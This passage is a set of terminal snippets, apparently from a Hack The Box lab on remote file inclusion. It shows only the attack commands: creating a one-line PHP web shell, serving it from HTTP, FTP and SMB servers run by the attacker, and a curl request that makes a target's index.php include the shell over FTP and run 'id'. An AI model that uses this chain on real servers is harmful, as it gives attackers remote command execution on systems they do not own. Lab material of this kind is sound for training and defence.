...
```shell-session
xF1NN@htb[/htb]$ echo '<?php system($_GET["cmd"]); ?>' > shell.php
```
...
```shell-session
xF1NN@htb[/htb]$ sudo python3 -m http.server <LISTENING_PORT>
...
```shell-session
xF1NN@htb[/htb]$ sudo python -m pyftpdlib -p 21
...
```shell-session
xF1NN@htb[/htb]$ curl 'http://<SERVER_IP>:<PORT>/index.php?language=ftp://user:pass@localhost/shell.php&cmd=id'
...SNIP...
...
```shell-session
xF1NN@htb[/htb]$ impacket-smbserver -smb2support share $(pwd)
